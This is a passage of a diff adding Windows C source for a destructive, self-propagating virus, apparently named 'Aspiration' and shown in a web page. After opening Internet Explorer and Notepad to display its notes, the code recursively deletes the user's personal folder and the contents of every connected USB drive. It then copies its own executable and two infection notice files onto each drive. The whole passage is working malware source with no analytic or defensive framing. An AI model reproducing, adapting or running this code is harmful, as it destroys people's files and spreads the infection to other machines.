+		ShellExecute(NULL, &quot;open&quot;, &quot;IExplore.exe&quot;, szWinDirHTML, NULL, SW_MAXIMIZE);
+	
+		/* Use Notepad to open the two text files */
+		ShellExecute(NULL, &quot;open&quot;, &quot;notepad.exe&quot;, szFileTXT1 ,NULL, SW_SHOWNORMAL);
+		ShellExecute(NULL, &quot;open&quot;, &quot;notepad.exe&quot;, szFileTXT2 ,NULL, SW_SHOWNORMAL);
+	}
+
+	/* ############################################################### */
+	/* --- ---- EVERYTHING BELOW THIS LINE IS DESTRUCTIVE CODE --- --- */
+	/* ############################################################### */
+
+	SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, szPersonalFolderPath);
+
+	/* Delete all files and folders recursively in personal folder */
+	DeleteDirectoryRecursive(szPersonalFolderPath);
+
+	/*
+	If a USB flash drive is connected to the computer:
+	-&gt;Delete files and folders recursively
+	-&gt;Copy virus to the drive
+	-&gt;Copy the two text files to the drive
+	*/
+	for(i = 0; drives[i]; i++)
+	{	
+		HANDLE hFile;
+		HMODULE Mod;
+		char szUSBPath[MAX_PATH];
+		char szVirusPath[MAX_PATH];
+		DWORD dwNumberOfBytesWritten;
+
+		Mod = GetModuleHandle(NULL);
+		GetModuleFileName(Mod, szVirusPath, sizeof(szVirusPath));
+
+		if (IsItUSB(drives[i]) == 1)
+		{
+			DeleteDirectoryRecursive(drives[i]);
+
+			strcpy_s(szUSBPath, MAX_PATH, drives[i]);
+			strcat_s(szUSBPath, MAX_PATH, &quot;\\aspiration.exe&quot;);
+			CopyFile(szVirusPath, szUSBPath, FALSE);
+
+			strcpy_s(szUSBPath, MAX_PATH, drives[i]);
+			strcat_s(szUSBPath, MAX_PATH, &quot;\\ASPIRATION_INFECTION.txt&quot;);
+
+			hFile = CreateFile(szUSBPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			WriteFile(hFile, szTextFile1, sizeof(szTextFile1), &amp;dwNumberOfBytesWritten, NULL); 
+			CloseHandle(hFile);
+
+			strcpy_s(szUSBPath, MAX_PATH, drives[i]);
+			strcat_s(szUSBPath, MAX_PATH, &quot;\\FOR_AV_SECURITY_COMPANIES.txt&quot;);
+
+			hFile = CreateFile(szUSBPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			WriteFile(hFile, szTextFile2, sizeof(szTextFile2), &amp;dwNumberOfBytesWritten, NULL); 
+			CloseHandle(hFile);
+		}
+	}
+}
+</pre></body></html>
